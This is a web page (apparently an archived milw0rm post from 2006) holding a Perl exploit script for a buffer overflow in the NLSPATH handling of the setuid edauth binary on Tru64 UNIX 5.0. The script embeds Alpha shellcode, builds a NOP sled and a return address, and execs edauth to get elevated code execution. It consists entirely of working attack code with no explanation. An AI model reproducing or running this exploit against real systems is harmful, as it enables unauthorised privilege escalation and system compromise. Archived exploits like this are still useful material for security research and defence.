<html><head><title>Tru64 UNIX 5.0 (Rev. 910) edauth NLSPATH Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl -w
#
# based on work by stripey from back in the day
# kf_lists[at]digitalmunition[dot]com
#
# http://www.digitalmunition.com

$sc .= &quot;\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42&quot;;
$sc .= &quot;\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2&quot;;
$sc .= &quot;\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2&quot;;
$sc .= &quot;\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43&quot;;
$sc .= &quot;\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43&quot;;
$sc .= &quot;\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6&quot;;
$sc .= &quot;\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22&quot;;
$sc .= &quot;\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26&quot;;
$sc .= &quot;\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43&quot;;
$sc .= &quot;\x20\x35\x60\x42\xff\xff\xff\xff&quot;;

print &quot;Shellcode is &quot; . length($sc) . &quot; bytes long \n&quot;;

$tlen = (1024-(length($sc)))/4;

$ENV{&quot;NLSPATH&quot;} = &quot;&quot;;
system(&quot;ulimit -c 10000&quot;);
# 0x140010200 Compaq Tru64 UNIX V5.0 (Rev. 910) (TruNastyWhore.localdomain) 
# 0x140012002
$ret = &quot;\x02\x20\x01\x40\x01&quot;;
$ENV{&quot;NLSPATH&quot;}= pack(&quot;l&quot;,0x47ff041f) x ($tlen) . $sc . $ret;
$heapgrow = &quot;B&quot; x 10000 . &quot; &quot; .  &quot;C&quot; x 10000 . &quot;D&quot; x 10000;
exec(&quot;/usr/tcb/bin/edauth -df DMr0x.$heapgrow&quot;);

# milw0rm.com [2006-03-29]</pre></html>